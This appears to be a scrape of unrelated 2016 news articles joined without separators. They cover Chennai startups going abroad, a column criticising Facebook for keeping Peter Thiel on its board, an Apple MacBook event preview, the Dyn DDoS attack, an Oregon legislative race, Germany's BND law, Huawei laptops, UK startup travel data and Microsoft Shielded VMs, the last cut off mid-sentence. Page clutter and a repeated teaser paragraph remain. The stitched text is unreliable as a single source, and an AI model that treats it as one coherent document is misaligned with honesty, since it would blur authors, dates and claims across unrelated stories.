STARTING from automobile company Ashok Leyland (they launched India’s first indigenous electric bus earlier this week) to FMCG conglomerate CavinKare, with presence in over 20 countries, Chennai-based enterprises have been making impactful forays into foreign lands for a while now. More recently, we’ve been noticing startups setting up offices abroad, picking up awards along the way (think Freshdesk). In fact, one such player, Zoho Corporation, after setting up an office in California, saw their client base increase so much that they are now investing a fortune in an upcoming data centre in the country. We speak with four entrepreneurs who are making an impact on foreign shores and inspiring others. Vijay Karunakaran Fourteen years at Intel taught Vijay Karunakaran a thing or two about man-management. This came in handy when he started InGage in 2013, developing gaming software, and augmented and virtual reality services. He now has offices in the US and Singapore, and launched his first one in Dubai two weeks ago. The laurels that came his way (his sister app development platform, Buzztm, recently featured in NASSCOM’s list of the top 12 startups this year) barely reveal the challenges that he faced when setting up shop outside the country. “Language barriers, cultural differences and long distance management are all major obstacles that crop up when you have businesses abroad,” he says. Despite that, he has managed to get 100 customers in the last two months. We are not surprised. After all, he is the man who developed Karbonn Kochadaiiyaan, the 4D augmented reality app themed on Rajnikanth. Details: myingage.com V Ramakrishnamoorthy Backed by clients like Google and Microsoft, Impiger Technologies has developed over 500 apps so far, including their latest ones for US-based restaurant chains like Applebee’s and IHOP, and Chennai-based companies like Fenner India and Rane Group. Owner V Ramakrishnamoorthy—who started overseas operations in Dallas, USA, in 2005, and has since employed over 300 people across the globe (of which 280 are in Chennai and Coimbatore)—believes that the differences between domestic and international deals lie in factors like pricing. His company currently gets 25 per cent of its revenue from Google. That said, they are going to collaborate with the Landmark Group in Dubai, along with the city’s law department (offering an automated mobile interface for lawyers to check documents on the go). Details: impigertech.com Umesh Sachdev It may have taken nine long years, but when Umesh Sachdev was selected as one among the ‘Top 10 Millennials Changing the World’ by the Time magazine this June, the world sat up and took notice. His app, Uniphore, excels in developing speech recognition software and allows users to interact with their digital devices in their native languages. Launched in 2007, it now has over 70 enterprise clients and four million users, and features in the list of companies ranked by Deloitte Technology Fast 500. With this background (plus six patents to boot), Sachdev started his international expansion in 2014. “Before heading to bigger markets like Europe and USA, we chose Philippines, Singapore and Dubai. Once we tested our potential there, we decided to tie-up with partners in the US,” he says. He believes that Chennai has a good product talent pool. “Hence we have set up our product office here and services offices in Bengaluru,” he shares,  adding that they will be focussing on the US and  Asian markets for the next two-three years. Details: uniphore.com Sid Vishwanathan Many of you may remember CardMunch, the app that created digital versions of business cards. It was acquired by LinkedIn in 2011, only to be shut down later after the social network moved on to Evernote. Its founder, Sid Vishwanathan currently owns Sweetness Technologies, an app that allows users in San Francisco to send personalised gifts to their loved ones, along with video greeting cards. Looking back, he says, “I spent almost four years at LinkedIn working on CardMunch. But as an entrepreneur, the itch to start something new never goes away and I decided to go back to the drawing board,” he shares, lamenting that talented entrepreneurs from India have a tough time setting up businesses as non-resident founders in Silicon Valley. “Over a five-year period, we processed nearly 100 million business cards, thanks to my workers, the majority of whom are from Chennai,” he adds.

Michael Hiltzik Columnist BUSINESS Michael Hiltzik Column Facebook won't dump billionaire Peter Thiel from its board because it cares about 'diversity' thiel Brian van der Brug/Los Angeles Times Libertarian billionaire Peter Thiel speaking on behalf of Donald Trump at the Republican National Convention in July Libertarian billionaire Peter Thiel speaking on behalf of Donald Trump at the Republican National Convention in July (Brian van der Brug/Los Angeles Times) Michael HiltzikContact Reporter Mark Zuckerberg, the undisputed monarch of Facebook, took to his own website the other day to mount an impassioned defense of one of his handpicked board members, Peter Thiel. “We care deeply about diversity,” Zuckerberg wrote. “That’s easy to say when it means standing up for ideas you agree with. It’s a lot harder when it means standing up for the rights of people with different viewpoints to say what they care about….That’s ultimately what Facebook is about: giving everyone the power to share our experiences, so we can understand each other a bit better and connect us a little closer together.” That sounds proper superficially, as an answer to critics who argue that Thiel should be dumped from the board because of his association with Donald Trump and other reasons. Dig a little deeper, however, and it proves to be remarkably tone-deaf. So, too, does a defense of Thiel launched by executives at the Silicon Valley startup incubator Y Combinator, where Thiel is a partner. The partnership’s president, Sam Altman, has tweeted that he disagrees with Thiel’s support of Trump, but “YC is not going to fire someone for supporting a major party nominee ... We need to talk to each other more, not less…. Cutting off opposing viewpoints leads to extremism and will not get us the country we want." We care deeply about diversity. — Mark Zuckerberg defends keeping libertarian billionaire Peter Thiel on the Facebook board A little background about Thiel might point to why he’s not just another employee with a heterodox political viewpoint, and why his role in Facebook, especially, warrants more than Zuckerberg’s casual brushoff.  Thiel is a billionaire, thanks to his role as co-founder of PayPal. He also was an early investor in Facebook, of which he owned about 1 million shares as of March 31, according to Facebook’s most recent proxy statement.  Thiel is a supporter of Donald Trump’s presidential campaign, to which he recently made a $1.25-million donation. That marks him as virtually unique in Silicon Valley; other than Thiel, not a single executive or major investor in a major high-tech company from the region appears on the list of corporate signers to an open letter supporting Trump released earlier this month. After Intel CEO Brian Krzanich abruptly canceled a fund-raiser for Trump at his home in June, the executive explained that he was not endorsing Trump (or any candidate), had intended the event to foster an “open dialogue,” and canceled it when it morphed into a fund-raiser. At Facebook, Mark Zuckerberg moves to tighten the gag on shareholders — and no one can stop him Michael Hiltzik No one would ever mistake Facebook for a shareholder-friendly company. From the moment of its initial public offering in May 2012, it's been entirely under the control of its co-founder, chairman and CEO, Mark Zuckerberg. Thanks to a two-class stock structure in which Zuckerberg held impregnable... No one would ever mistake Facebook for a shareholder-friendly company. From the moment of its initial public offering in May 2012, it's been entirely under the control of its co-founder, chairman and CEO, Mark Zuckerberg. Thanks to a two-class stock structure in which Zuckerberg held impregnable... (Michael Hiltzik) Outside the political realm, Thiel gained renown this year by secretly funding Hulk Hogan’s legal campaign against the celebrity website Gawker, which effectively led to Gawker’s demise. Thiel had a personal beef with Gawker, which he thought had disclosed his homosexuality prematurely, and seems to have used Hogan’s lawsuit to settle scores by proxy. An avowed libertarian, he lamented in a piece for the libertarian Cato Institute the “vast increase in welfare beneficiaries and the extension of the [voting] franchise to women.” Calling them “two constituencies that are notoriously tough for libertarians,” he wrote that the twin phenomena “have rendered the notion of ‘capitalist democracy’ into an oxymoron.” By almost any measure, then, Thiel is an outlier in Silicon Valley. "Peter Thiel is a contrarian," Amazon founder Jeff Bezos said in a recent interview, adding, "You have to remember that contrarians are usually wrong." That in itself doesn’t justify tossing Thiel from the Facebook board. Yet it’s proper to think harder about what a corporate board is expected to do. To begin with, Zuckerberg’s bow to the principle of “diversity” at his company is a joke. There’s no real diversity in Facebook’s management; its shareholding are under the unassailable control of Mark Zuckerberg, who owns less than 15% of all company shares but 76.4% of its class B shares, which carry 10 votes per share. That gives him 53.8% of total shareholder votes, according to the most recent proxy. At the company’s annual meeting in June, shareholders agreed to create a third class of stock, which will allow Zuckerberg to donate much of his shareholding to charity without ceding voting control. The Facebook directors, then, really serve as nothing but office decor at Facebook headquarters. Zuckerberg can talk all he likes about how the individual board members, who include venture investor Marc Andreessen, the banker and political figure Erskine Bowles and Facebook’s highly regarded chief operating officer, Sheryl Sandberg, are there to contribute their vast experience in their fields to his decision-making. But none of them owns voting power of even 1%, or any genuine authority. If Zuckerberg wanted their advice, he could ask them  and wouldn’t need to pay them the more than $350,000 they each receive in cash and stock for serving. They’re on the board to project a certain image for Facebook—technically savvy, public-spirited and yes, diverse. What image, then, does Peter Thiel project for the company? He’s expressed publicly a distaste for social and political inclusiveness—too bad that welfare recipients and women must have a voice in governance. He’s taken a hostile stance against the free expression of ideas, by hounding into near-extinction a new organization whose actions, which were legal, he didn’t like.  Then there’s his association with Trump. Zuckerberg asserts that “there are many reasons a person might support Trump that do not involve racism, sexism, xenophobia, or accepting sexual assault.” That’s true, but it doesn’t obscure the fact that the person Thiel is supporting is a retailer of racism, sexism, xenophobia, and brags about sexual assault. Regardless of whether Thiel likes Trump because of his claims to support “smaller government” and “a different tax policy,” those other elements are inextricable parts of Trump’s character. Trump’s temperament and policies, which include violent hostility to a free press, are inimical to the role Facebook wishes to play as a social medium and information service. By defending Thiel’s relationship with Trump as merely an affiliation with a political viewpoint, Zuckerberg is associating his company with the most noxious and extreme features of national politics. The same goes for Y Combinator. Not even every Republican has stood up for Trump (and more would probably speak out against him if they weren’t making a political calculation of their own). How can these companies decide that this is just politics? It may be that Zuckerberg genuinely feels that Thiel brings something to the boardroom that’s of real value to Facebook. He shouldn’t be forced to dump Thiel from his board (not that he could be). But he needs to give the matter more thought, and make a more compelling argument. To say that a billionaire has a right to serve Facebook in the name of “diversity,” or that keeping Thiel around somehow empowers the rest of us to “share our experiences” and “understand each other” and “connect...a little closer together” is too asinine for words.

Finally. We've been waiting for this MacBook Pro overhaul for years. The event will be taking place at 1pm ET and we'll be covering it as it happens. As always, Apple will be livestreaming the presentation on its website. You can watch with Safari for macOS, Safari on iOS, the Apple TV, or Microsoft Edge on Windows 10. As always, a lot of what we're expecting to see has been leaked out. Here's what to expect. A totally redesigned MacBook Pro Image: Martin Hajek - This is a design concept of what Apple's new MacBook Pro with OLED touchscreen could look like. This is the big one. Apple is expected totally overhaul its 13-inch and 15-inch MacBook Pro notebooks. This is a big deal because the actual MacBook Pro design hasn't been changed since 2012, when Apple rolled models with Retina displays. Since then, we've begged and pleaded with Apple to release something worthy of replacing the 2012 MacBook Pro with Retina display. Back in May, analyst Ming Chi-Kuo from KGI Securities reported that Apple was going to overhaul the MacBook Pro, making it thinner and offering an OLED touchscreen above the keyboard. The touchscreen will sit where your function keys sit on the MacBook Pro now, and will dynamically change, based on what apps you're using and what is on your screen. Cult of Mac later obtained "spy photos" of the chassis, showing off where the OLED touchscreen will sit. Image: Cult of Mac The MacBook Pro is also expected to add USB-C ports and Thunderbolt 3 ports for faster connectivity. In fact, a recent Macotakara report suggests Apple will only have USB-C ports on the MacBook Pro. Apple could even get rid of MagSafe, its long-patented (and very useful) power adaptor, and use just USB-C. When it comes to internals, Bloomberg reported back in August that the new MacBook Pro would use AMD graphics. As for processors, Apple could go with Intel's sixth-generation Core Skylake chipset or it could update to the new Kaby Lake processors. We'd love to see Kaby Lake MacBook Pros, especially after waiting this long, but it might come down to yields. Updated MacBook Air Image: Apple Although the MacBook Pro is expected to be the big star of the event, Apple is also expected to update the MacBook Air. Though it might have lost its thin and light crown to the MacBook, it's still Apple's best-selling notebook. It's also Apple's most affordable. Both Bloomberg and Macotakara report that the MacBook Air will be updated with USB-C and Thunderbolt 3 support. The actual hardware design, which Apple has used since 2010, is expected to be the same. The screen is not expected to get an upgrade, so if you want Retina, you need to pony up for a MacBook or MacBook Pro. Macotakara also reports that Apple will be getting rid of the 11-inch MacBook Air, leaving only the 13-inch model in the lineup. Updated iMac Bloomberg reports that Apple will update its 4K and 5K iMacs with faster processors. This makes sense, since Apple did the same thing last year. It's possible the iMac could also get USB-C ports, though we are really hoping to see some Thunderbolt 3 love. Graphics on the iMac are also expected to get a boost, thanks to newer chips from AMD. 5K External Display Back in June, Apple discontinued its beautiful Thunderbolt Display. The discontinuation was notable because there wasn't another product in Apple's lineup to replace it. For years, professional users who use 4K displays have asked where Apple's first-party solution might is. The problem is that in order to successfully drive a 5K display, you need powerful graphics, something a lot of MacBooks just don't have. Back in June, 9to5Mac reported on rumors that Apple was working on a 5K display with an external GPU, in order to drive that needed performance. We just might see it this week. If Apple does roll-out Thunderbolt 3 across its laptop line, that could pave the way for a 5K display with built-in GPU. No Mac mini and Mac Pro updates Image: Apple Apple hasn't updated the Mac Pro since its release three years ago. Unfortunately, it doesn't look like the Pro machine will get an update, even thought the addition of USB-C and Thunderbolt 3 would be very welcome to pro users. Similarly, the Mac mini hasn't had an update since October 2014. The Mac mini is a low-volume seller, but plenty of users rely on it for an inexpensive Mac; it's also often used as a server. Sadly, the Mac mini isn't expected to get an update this time.

The DDoS attack targeted New Hampshire-based company Dyn and its managed DNS infrastructure, and began early Friday morning. The company originally said that it restored operations around 9:30 a.m. Eastern Time, but a second attack followed that knocked Twitter and others offline again for some users, especially those on the East Coast of the US. The attack is ongoing and is causing outages and slowness for many of Dyn’s customers. The White House press secretary said that the US Department of Homeland Security is investigating, but so far no one knows who might be behind the attacks. “This is a reminder of how effective an attack on one can be an effective attack on many,” Intel Security CTO Steve Grobman said via email. “DNS is one of those internet infrastructure capabilities upon which we all rely. An attacker seeking to disrupt services to multiple websites, may be successful simply by hitting one service provider such as this, a DNS provider, or providers of multiple other Internet infrastructure mechanisms.” DNS service translates website names into IP addresses. Delegating such service capabilities to such multi-tenant service providers has tremendous benefits over traditional architectures where companies are responsible for running their own capabilities. But it also means that if those services are targeted with attacks of significant scale, all tenant services relying on a provider could be impacted. “Given how much of our connected world must increasingly rely upon such cloud service providers, we should expect more such disruptions,” Grobman said. “We must place a premium of service providers that can present backup, failover and enhance security capabilities, allowing them to sustain and deflect such attacks.” Mark Chaplain, VP EMEA for Ixia, told us that botnets are likely behind the offensive. “The availability of ‘DDoS as a service’ and large-scale botnets for hire makes it relatively easy to launch large-scale attacks that can even disrupt the operations of these internet services companies, which have infrastructures designed to handle high traffic volumes,” he said. “Organizations can mitigate the impact of these attacks by reducing their attack surface—blocking web traffic from the large numbers of IP addresses globally that are known to be bot-infected, are known sources of malware and DoS attacks.” Higher-volume attacks have become more frequent.  "With the sheer volume of traffic that the modern DDoS attacks can create (see the recent Brian Krebs DDoS attack as one good example), even the best defenses can be strained to protect against these monstrous attacks, which requires constant improvements to infrastructure and the methods in which these organizations defend themselves from DDoS and other cyberattacks," said Nathan Wenzler, principal security architect at AsTech Consulting, via email.

By Nicole Montesano • Staff Writer • October 21, 2016 Tweet Moore, Noble vie for House District 24 seat   [Scroll down to read "Noble tries hand at politics."] Moore makes second run Local handyman and volunteer Ken Moore, a Democrat, is making a second attempt at securing the seat of Republican Jim Weidner in Yamhill County’s House District 24. He ran against Weidner, now retired, two years ago. This time he is vying with former McMinnville Police Chief Ron Noble. Moore said he wants to address transportation, education and affordable housing, as those are the issues voters tell him they are most concerned about. He believes these are areas where he believes he can make a difference. Moore said in education, he wants to make “targeted investments” in two specific areas ,career and technical education and early childhood education. He said he “knocked on 6,000 doors” in the district during this campaign cycle, and added, “You won’t find anyone who doesn’t want more career and technical education.” Schools have cut what used to be called vocational education, Moore said, “because schools are not graded on it,” and the emphasis on test scores eliminated classes in which scores are not tracked. Furthermore, Moore said, “We thought we weren’t going to need manufacturing jobs for a while,” as the state focused more on technology, “so the emphasis went away.” Returning those classes, he said, would greatly increase high school graduation rates. He said test scores and graduation rates also would increase if the state invested more to ensure children come to school ready to learn. Moore, whose résumé lists work as an electrical engineer for both Intel and Hewlett-Packard, currently works as a handyman. He said he has also farmed and volunteered in numerous venues, listing service as a planning commissioner in Yamhill, local Scoutmaster, Gallery Theater president, Sunday school teacher, ASPIRE counselor and host of the local public access television show, “Local Matters.” He said he is the ideal person to represent the district, because he is a “rural Democrat.” “I own guns and I’m concerned about agriculture,” he said. “I’ve farmed. I’ve been out in the field at 2 a.m. when the hay wagon is broken down and the bales are falling down and there’s no one else around.” Moore said he understands and struggles with the division between the interests of land use watchdog group 1,000 Friends of Oregon and farmers and loggers. He said the latter may agree with restrictions on urban sprawl, but may not on stream buffers and pesticide restrictions. “I would be looking at what is the interest here in this district,” he said. Moore has pledged to work hard to secure funding for completing the Newberg-Dundee bypass. “Funding for the bypass is a top priority,” he said. “The Band-Aid at both ends is going to fail.” He argues, “It’s imperative to pass a robust transportation bill this session,” an area where he believes he can make a difference. On the contentious issue of immigration, he said, “If they’re in this state supporting themselves, they’re probably paying taxes. If we exported all our illegals ... we’d be in big trouble.” Moore said he hears constantly from people that affordable housing is a top priority for them. He said he believes the answer is to provide incentives for builders to construct more affordable housing. That would also help to address problems such as homelessness, he said. Moore said he supports the current land use laws, believing they are working as intended — to protect farmland. He said cities in the county have sufficient residential land, particularly if they focus on in-fill. However, he said, a new law that provides some protection against issues that have lead to lengthy fights before the state Land Use Board of Appeals in the past should make it easier for cities to expand their urban growth boundaries. Moore made it clear he dislikes being asked about contentious Measure 97, which would tax the gross sales of large corporations, whether they turn a large profit, small profit or no profit at all. He said, “It’s not my job to defend it.” In an editorial board interview with the News-Register, he did proceed to defend it. He expressed support for the measure, projected to funnel another $3 billion a year into state funds, by saying the state desperately needs more income to address problems such as large classroom sizes, rising college tuition and failing roads and bridges. In a Thursday candidate forum hosted by the McMinnville Kiwanis Club, he said it wasn’t up to him; it was up to voters. His opponent has made an issue out of seeking out and eliminating government waste. Moore said there is merit in that, but it’s not the whole answer. “Audits are a good thing,” he said. But he said, “I don’t think you’re going to audit your way out of a $1.3 billion shortfall.” If elected, Moore said he doesn’t plan to throw his weight around. He said he would be guided by more senior members of the party. “There’s no will to go in and say, ‘Hey guys, Ken’s here. There’s a new rep in town.’”   Noble tries hand at politics Republican Ron Noble is a career police officer who headed the McMinnville Police Department from 2006 to 2014, and now directs campus public safety at Linfield College. But he said he’s “always been interested in politics.” And that interest was sharpened, he said, during the time he spent as head of the Association Chiefs of Police, working with state legislators on various proposed bills. “I got a real taste for how divided and partisan” the Legislature can be, he said. So when State Rep. Jim Weidner said he was thinking of retiring, Noble jumped at the chance to get in. He said he wants to return bipartisan cooperation to the Legislature. And he believes his years of heading the police department will provide good experience for the job. “I’m tired of the extreme party politics,” Noble said. “I don’t believe anybody is extreme right or extreme left. I believe people have a range of beliefs, depending on the issue. Some are extreme right, some are in the middle, and maybe sometimes they’re on the left.” He said he believes 2011 and 2012, when the state House was evenly divided between Democrats and Republicans, proved “some of the most productive legislative years,” because opposing lawmakers “actually had to talk” to pass legislation. Noble said he also has a solid understanding of social and health care issues, through his wife’s work in the health care field, which helped shape his views on social issues. He called contentious Measure 97 “the worst idea I’ve ever heard,” saying affected businesses would pass on as many of the costs as possible to consumers, who can ill afford more expenses. He said people with comfortable incomes can absorb some additional costs, but many other members of the community can’t. “I think it’s going to hurt people with middle and lower incomes,” he said. On the current hot-button issue of immigration, Noble takes a measured view. Citizenship is, and should be, a basic requirement for voting, he said. As for illegally entering the country, “I was a cop,” Noble said. “Let’s follow the law.” But he also added, “The law has to be capable of being followed.” He cited the case of an acquaintance and the acquaintance’s wife, who both moved to the U.S. as children. The husband’s parents took the trouble to naturalize him, but the wife’s did not, and that has caused her great hardship. At this point, he said, “They have $15,000 to $18,000 invested. She was told she has to go to Mexico to apply, and they’ve been there since January.” They are at risk of being kidnapped by drug cartels, so they have to keep moving from town to town, as they try to work their way through the process. “They’re both college graduates, productive residents, and they want to do the right thing,” Noble said. “But $15,000? “The system is broken. You have to provide a way to follow the law.” As a state legislator, however, Noble said his focus will be on state issues. “Government is responsible for infrastructure — education funding, transportation, public safety, health care,” he said. He said he wants to stabilize funding for education, address the cost of college tuition and reduce wasteful government spending. “There’s a lot of money we just throw away,” he said. “I’ve yet to find a government where you couldn’t do better.” Departments in McMinnville don’t overspend wastefully because the city does not penalize them for not using up their entire budgets by year’s end. Following that example at the state level, he said, could help reduce waste. Another goal is to “loosen the dictates on small businesses, look at long-term impacts and unintended consequences.” As an example, he mentioned the recent increase in minimum wage. “I’m all for people making more money, but I’m concerned that we just promised what the minimum wage is going to look like six years from now,” he said. On the issue of health care, he said, “The state’s role is to make sure Medicare is expanded and funded adequately,” something he said can be improved. “More people have access now,” he said, “and that’s a great thing. I wouldn’t say it’s more affordable yet, though. It’s still in transition.” There are also problems with needing funding for care not currently covered, he said, and loosening some restrictions on medical care would be beneficial. Noble said Oregon “should get government out of the retirement business,” by leaving retirement provisions “up to individual agencies.” He urged, “Cut off the gravy train with new employees and then figure out how to keep our commitments.” Noble acknowledged he himself is a recipient of the state Public Employees’ Retirement System, saying he retired at 60 percent of his working salary.

According to the new law, German Intelligence is supposed to be under a greater control but at the same time receive more powers that might enable it to spy on European governments and NGOs. While the majority of German MPs voted in favor of the reform, some critics from the Left party and the Green party claim that the new legislation has simply legalized spying on the population. "Unfortunately, the chance to adopt a reasonable law that would put the Federal Intelligence Service under parliamentary control has been missed," member of the Green party and member of the parliamentary committee for the control of intelligence services, Hans-Christian Ströbele, said in an interview with Sputnik. © Flickr/ Philippe Put German Parliament Passes Law Limiting Intel Agency's Spy Powers"The law provides for the creation of a supposedly independent monitoring body whose members will be appointed by the Federal Government. This means that the federal government controls itself. But let me remind you that in certain cases — when the legislation was violated — the Federal Government worked together with intelligence," he added. Last April, an espionage scandal gripped Germany as local media uncovered that the BND had provided technical assistance to the US National Security Agency (NSA) in spying on European targets, including top political figures and corporations. The BND is believed to have spied on some 800,000 IP addresses, phone numbers and email addresses at the request of US intelligence. Under the new system, the BND will still be allowed to work with the NSA, but only under certain strict conditions: fighting terrorism or to protect Germany's national security. At the same time, the powers of the intelligence body are supposed to be enhanced, thus giving it an opportunity to tap European governments and non-governmental organizations again, Ströbele claimed. "This happened before and is happening now. Only now, these actions will be backed by the law," the politician stated. Ströbele also stated that his party will file a lawsuit to the Constitutional Court, claiming that the new surveillance practice is contrary to the German constitution. "I am convinced that the Constitutional Court will take into account our arguments. The problem, however, is that the decision of the Constitutional Court may take years, while the law will be in force all the time," he concluded. ...

High-End Windows 10 Laptops Prepared by Huawei for Early 2017 GO Second-generation MateBook already in the works Oct 21, 2016 08:57 GMT  ·  By Bogdan Popa  ·  Share:  The Windows 10 device ecosystem is growing with more high-end devices, and now Huawei is the company that’s looking to benefit from the increasing demand for such models. The company is believed to be so pleased with the success of the first-generation MateBook 2-in-1 device that it’s already preparing the unveiling of the second model, and according to a report from DigiTimes, this could take place in the first quarter of 2017. The new MateBook models will come in two different configurations, with 13.3-inch and 15.6-inch displays, and will be powered by Intel Core i-series processors, the source says. Coincidentally or not, Microsoft is also planning to take the wraps off the new Windows 10 Redstone 2 update in the first months of 2017, so Huawei might be trying to align the release of the new models with the debut of the Windows 10 update. This means that the new MateBooks could come with Redstone 2 pre-installed, but even if they don’t, the update will still be available anyway. Huawei could become a direct Microsoft Surface rival Furthermore, Microsoft is also planning its own share of hardware launches in the first months of 2017, and it’s believed that the Surface Pro 5 and the Surface Book 2 are likely to be included in this device update cycle. The first-generation Huawei MateBook was indeed a pretty compelling product and came with Intel m3 and m5 processors, up to 8 GB RAM, and 512 GB SSD storage. The first model featured a 12-inch full HD IPS screen with a resolution of 2160x1440 pixels and touch support and was running Windows 10. Without a doubt, the second generation will feature powerful hardware too, and given the fact that Huawei is already planning the switch to i processors, they might become direct competitors to Surface Pro models. Huawei is already offering good value for the money, so the new models will certainly be worth a look at. #Huawei#Surface#MateBook#Windows 10#Windows 10 laptop subscribe feedly old reader newsblur digg reader rss feed reddit it! flip it share it tweet it Related  ·  Hot right now  ·  Latest news Microsoft Expects Windows Phone to Continue Its Collapse in the Short Term Microsoft Pulls Skype for Windows Phone Microsoft Revenue Is Increasing but Not Thanks to Windows Microsoft Reveals Another Major Drop for Windows Phone Firefox 50.0 Officially Released for Linux, Mac and Windows, Here's What's New Some U.S. Android Phones Have Secret Backdoor That Sends Data to China Apple Insider Says iPhone 6 Plus Has a Major Bug, Company Should Start Recall Hackers Steal FIFA Currency, Buy Houses and Expensive Cars with the Money Microsoft Pledges to Completely Retire Office 2007 Next Year X.Org Server 1.19.0 Officially Released, Coming Soon to a Linux Distro Near You Red Hat Software Collections 2.3 and Red Hat Developer Toolset 6 Available Now Linux Kernel 4.4.32 LTS Adds Networking Improvements, Updated AMDGPU Drivers    The first-generation Huawei MateBook New Apps GdPicture.NET Document Imaging SDK: Full-Featured and Royalty Free Document Imaging toolkit for .NET allows you to implement viewing, processing, printing or scanning files SmartFTP FTP Library: Integrate FTP and SFTP file transfer capabilities into your software with the help of this advanced FTP library ActiveX component (COM) Norton AntiVirus Virus Definitions: Signature packanges containing the latest free virus databases for various Symantec antivirus software for both home and business use Curse: Connect, chat, share files and send messages to friends from the games you are playing fast and easy with this intuitive application Kaspersky Virus Removal Tool: Detects viruses and other infections that may have reached one's computer with the aid of different scan modes provided by Kaspersky MediaGet: Search and download torrents from the Internet, being able to use the integrated media player to watch movies without even saving them to your PC first App Builder: Visually design HTML5 apps in a variety of sizes, without prior knowledge of programming techniques, thanks to this straightforward tool Reader comments Load old comments   The New Microsoft Is Playing Dirty like the Old Microsoft, Says Salesforce CEO more on: Microsoft i softpedia®     Like 202K    +1 56K     Follow 13K © 2001-2016 Softpedia.

Photograph: Gareth Fuller/PA Supported by About this content Dan Matthews @dan_matthews Friday 21 October 2016 02.35 EDT Last modified on Friday 21 October 2016 02.37 EDT Share on Facebook Share on Twitter Share via Email Share on LinkedIn Share on Google+ Share on WhatsApp Share on Messenger London remains king of the startups, but new travel data suggests towns around England are growing in entrepreneurial muscle. Figures from booking service Trainline for Business show a steep rise in trips for presentations, supplier meetings and sales pitches on rail routes outside the capital. The figures, which cover the period March 2012 to June 2016 and strip out the effect of the growth in popularity of online booking, show the travel trends of nearly 500,000 business trippers from small- and medium-sized enterprises. The number of rail journeys from London to Brighton rocketed 230% over the period despite widely-reported disruption and delays on the Southern network. Swindon enjoyed a 183% bump, Peterborough 166% and Northampton 130%. It’s a huge set of increases in such a short space of time. The stats hint at a major demographic shift; perhaps one in which businesses are opting to locate in smaller metropolitan areas at the expense of major cities. If true, they could prophesise changes to the way people live and work in future. How little Leamington became a global player in gaming Read more Alasdair Rae, a senior lecturer in urban studies and planning at the University of Sheffield who analysed the data, said it was evidence of an emerging crop of entrepreneurial centres that are attracting startups and small businesses. “It’s clear something is happening,” he said, pointing to cheaper rents, lower house prices, skilled local labour markets and convenient access to the capital as the main drivers of business beyond the M25. “These factors have made running a business outside of London easier. Historically, lots of towns and cities were sold on the basis that you could get to London quickly, but now the equation is partially reversed. “Many people moved to Brighton to commute. Now it’s a brilliant place to do business in its own right with its maturing technology and media clusters. There are also disproportionately large tech scenes in Cambridge and Leamington Spa.” But large businesses are fanning out too. Swindon was given a boost in 2014 with the construction of Intel’s Internet of Things innovation centre, while other major players with a presence in the city include Zurich, Nationwide and RWE npower. Oxford, where rail journeys leapt 182%, is home to the Said Entrepreneurship Centre, the Oxford Foundry entrepreneurial hub, and the Oxford Seed Fund. All this innovation convinced Goldman Sachs to set-up its “10,000 Small Businesses” programme there in 2010. Meanwhile, Peterborough’s business credentials have been enhanced by a 240-acre business park and its Eco Innovation Centre. The link between more rail journeys and entrepreneurial activity is drawn out by separate data from the Centre for Cities. It reveals that in 2014, the most recent figures available, Northampton’s startup pedigree was second only to London. Do you live in an entrepreneurial hotspot? Read more During that year the town fostered 80 new businesses per 10,000 of the local population, a staggering rate of creation that leaves more famous industrial centres in its wake, including Manchester with 54, Birmingham with 44 and Liverpool with just 43. Between 2012 and 2014, Northampton enjoyed the fastest growth in new starts with a nearly 80% increase over the period. Its overall stock of businesses went up too by 17%, much faster than any other town or city in the UK. But, according to Rae, this doesn’t spell the end for big cities: “Location is more important than ever and although technology means businesses can locate outside major cities, they still benefit from being within touching distance. “Face-to-face meetings are essential for deal-making and there seems to be a cut-off point for areas more than an hour-and-a-half away from a major conurbation. It remains vital to physically get in front of clients.” He said Silicon Valley, the enormous and world-renowned centre for tech innovation in the US nestled between San Francisco and San Jose, would not have sprung up without vibrant cities full of talent to draw from. If true, the 90-minute effect could have major ramifications for cities to the north of London when the HS2 high-speed rail link is finally completed. The project, which is beset with delays, would speed up journeys linking London to Birmingham, Sheffield, Manchester and Nottingham. “Realistically, Birmingham is just beyond what most people would consider a commutable distance, but HS2 would bring Birmingham into London’s orbit. It will be interesting to see in which direction the skills travel,” said Rae. It also has implications for infrastructure planning: “It’s quite surprising that across the UK people are working on their smart cities programmes without thinking about their geographical position in the country and the fact they can’t change where they are,” he added. Perhaps they should look to Japan for an idea of what a hyper-connected UK might look like in future. The fastest train between Manchester and Liverpool takes 33 minutes and there’s only one an hour. The bullet train from Osaka to Kyoto – about the same distance – takes 12 minutes. A faster transport network would link the whole country; imagine what that could do for entrepreneurs everywhere.

And Microsoft thinks it has found a new way to secure VMs. Let's do Redmond first because its new “Shielded VMs” are one of the headline items in Windows Server and Hyper-V 2016. As explained to The Register by Microsoft program manager Dean Wells, Redmond reckons one of the things that holds back virtualisation is that virtual machines aren't yet as verifiably secure as their bare metal brethren. The main thing VMs are missing is something like Intel's trusted platform module (TPM), the cryptographic signing technique that binds a workloads to a known server. If you apply TPM to a server and then to an application, the workload just won't run unless it's on a server it's been told to trust. Or to put it in terms that Jurassic Park's Dennis Nedry would understand: without the magic word, you'll be locked out. Wells feels the lack of TPM for virtual machines means some organisations keep sensitive workloads on bare metal because they fear rogue admins can take a VM and run it elsewhere. That fear is fair enough because with a .VHD or .VHDX file, or their equivalents for non-Microsoft hypervisors, it's trivial to run a virtual machine. Wells told The Register that Microsoft clients are worried by this, because storage admins, network admins, vanilla sysadmins and other Dennis Nedry types can access the resources on which virtual machines reside. Shielded VMs aim to prevent VM exfiltration by providing a virtual equivalent to TPM, so that VMs just won't run unless they know the host is allowed to run them. Shielded VMs are also shorn of tools like VM console connection, PowerShell Direct and other things that let an admin reach out and touch them, reducing their attack surface along the way. Shielded VMs' disks are also encrypted (at rest and in motion) turning VMs from a portable package that can be plugged into a hypervisor and turning them into black boxes. Hyper-V itself must undergo a rigorous health attestation process before being allowed to run shielded VMs and Microsoft proposes that the provisioning of new shielded VMs must also conform to a known & trustworthy baseline configuration or provisioning will be aborted. Shielded VMs also boot from a virtual Unified Extensible Firmware Interface (UEFI), so that the state of the host and the VM can be verified as the VM fires up only releasing the encryption key if it’s still healthy. Windows Server 2016's new Host Guardian Service (HGS) gets the job of verifying whether hosts are allowed to run a Shielded VM and/or are in a fit condition to run it. With trusted hosts, only whitelisted VMs in operation (and then only after accounting for themselves as they boot), Microsoft feels you'll be able to embrace hybrid cloud with confidence, in a “trusted fabric” of infrastructure that could span multiple private and/or public data centres. For those yet to adopt TPM V2-enabled servers, there's also an option to use only Active Directory groups to verify VMs' Hyper-V host’s fitness for executing on shielded VMs. Microsoft proudly told world+dog it was way out in front of the VM security race with Shielded VMs, which launched a couple of weeks back at Ignite. That lead was 